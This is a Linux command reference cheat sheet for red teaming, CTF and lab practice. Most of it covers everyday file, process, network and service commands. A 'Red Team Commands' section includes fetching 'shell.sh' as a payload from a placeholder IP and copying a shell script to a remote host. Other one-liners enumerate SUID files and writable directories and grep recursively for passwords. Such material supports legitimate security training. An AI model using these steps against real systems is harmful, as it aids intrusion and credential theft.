# 💻 Linux Commands Cheat Sheet

> A practical Linux command reference for Red Teaming, CTFs, Bug Bounty, and daily terminal usage.

---

# Overview

This file contains the most commonly used Linux commands grouped by category. Instead of memorizing everything, use this as a quick reference during labs, HTB, THM, or penetration tests.

---

# File & Directory Commands

| Command | Description |
|----------|-------------|
| `pwd` | Show current directory |
| `ls` | List files |
| `ls -la` | List all files including hidden |
| `ls -lh` | Human-readable file sizes |
| `cd` | Change directory |
| `cd ..` | Move one directory back |
| `cd ~` | Home directory |
| `mkdir folder` | Create directory |
| `mkdir -p a/b/c` | Create nested directories |
| `touch file.txt` | Create empty file |
| `cp file1 file2` | Copy file |
| `cp -r dir backup` | Copy directory |
| `mv old new` | Move or rename |
| `rm file` | Delete file |
| `rm -r folder` | Delete folder |
| `rm -rf folder` | Force delete recursively |

---

# Viewing Files

```bash
cat file.txt

less file.txt

more file.txt

head file.txt

tail file.txt

tail -f logfile.log
```

---

# Editing Files

```bash
nano file.txt

vim file.txt

vi file.txt
```

---

# Searching

Find file

```bash
find / -name passwd
```

Find by extension

```bash
find . -name "*.txt"
```

Search text

```bash
grep "admin" users.txt
```

Recursive search

```bash
grep -r "password" .
```

Ignore case

```bash
grep -i root file.txt
```

---

# File Permissions

View permissions

```bash
ls -l
```

Change permissions

```bash
chmod 755 script.sh
```

Make executable

```bash
chmod +x script.sh
```

Change owner

```bash
sudo chown user:user file.txt
```

---

# User Commands

Current user

```bash
whoami
```

Current UID

```bash
id
```

Logged-in users

```bash
who

w
```

Switch user

```bash
su username
```

Become root

```bash
sudo -i
```

---

# Process Management

List processes

```bash
ps aux
```

Interactive monitor

```bash
top
```

Better process viewer

```bash
htop
```

Kill process

```bash
kill PID
```

Force kill

```bash
kill -9 PID
```

Find process

```bash
pgrep firefox
```

---

# Networking Commands

IP Address

```bash
ip a
```

Routing table

```bash
ip route
```

Ping

```bash
ping google.com
```

DNS Lookup

```bash
nslookup google.com
```

Download file

```bash
wget URL

curl URL
```

Open ports

```bash
ss -tuln
```

Netstat

```bash
netstat -tulnp
```

---

# Package Management

Update packages

```bash
sudo apt update
```

Upgrade

```bash
sudo apt upgrade
```

Install

```bash
sudo apt install nmap
```

Remove

```bash
sudo apt remove package
```

Search

```bash
apt search package
```

---

# Compression

Zip

```bash
zip archive.zip file.txt
```

Unzip

```bash
unzip archive.zip
```

Tar

```bash
tar -cvf files.tar folder/
```

Extract

```bash
tar -xvf files.tar
```

Gzip

```bash
gzip file.txt
```

---

# Disk Usage

Filesystem usage

```bash
df -h
```

Directory size

```bash
du -sh folder
```

---

# Services

Start

```bash
sudo systemctl start apache2
```

Stop

```bash
sudo systemctl stop apache2
```

Restart

```bash
sudo systemctl restart apache2
```

Status

```bash
systemctl status apache2
```

Enable at boot

```bash
sudo systemctl enable apache2
```

---

# SSH

Connect

```bash
ssh user@IP
```

Copy file

```bash
scp file.txt user@IP:/tmp
```

Generate SSH key

```bash
ssh-keygen
```

---

# File Transfers

Download

```bash
wget URL
```

Upload using Python server

```bash
python3 -m http.server 8000
```

Download using curl

```bash
curl -O URL
```

---

# Useful One-Liners

Find SUID files

```bash
find / -perm -4000 2>/dev/null
```

Find writable directories

```bash
find / -writable 2>/dev/null
```

Find hidden files

```bash
find / -name ".*" 2>/dev/null
```

List listening ports

```bash
ss -tuln
```

Show command history

```bash
history
```

---

# Red Team Commands

Start HTTP Server

```bash
python3 -m http.server 8000
```

Transfer file

```bash
scp shell.sh kali@IP:/tmp
```

Download payload

```bash
wget http://IP/shell.sh
```

Check architecture

```bash
uname -a
```

Kernel version

```bash
uname -r
```

OS Information

```bash
cat /etc/os-release
```

Current shell

```bash
echo $SHELL
```

Environment variables

```bash
env
```

---

# Common Mistakes

- Using `rm -rf` without checking the path.
- Forgetting `sudo` for administrative commands.
- Running commands in the wrong directory.
- Ignoring hidden files (`ls -la`).
- Copying files without preserving permissions.

---

# Interview Questions

1. Difference between `cp` and `mv`?
2. What does `chmod 755` mean?
3. Difference between `grep` and `find`?
4. What does `sudo` do?
5. Difference between `top` and `ps`?
6. What is the purpose of `systemctl`?

---

# Quick Revision

- `pwd` → Current directory
- `ls -la` → List hidden files
- `cp` → Copy
- `mv` → Move/Rename
- `rm -rf` → Delete recursively
- `grep` → Search inside files
- `find` → Search files/directories
- `chmod` → Change permissions
- `chown` → Change ownership
- `ps aux` → List processes
- `ip a` → Show IP address
- `systemctl` → Manage services
- `df -h` → Disk usage
- `du -sh` → Directory size

---

# References

- Linux Documentation Project
- Ubuntu Documentation
- Kali Linux Documentation
- GTFOBins
- OverTheWire Bandit
- TryHackMe Linux Fundamentals
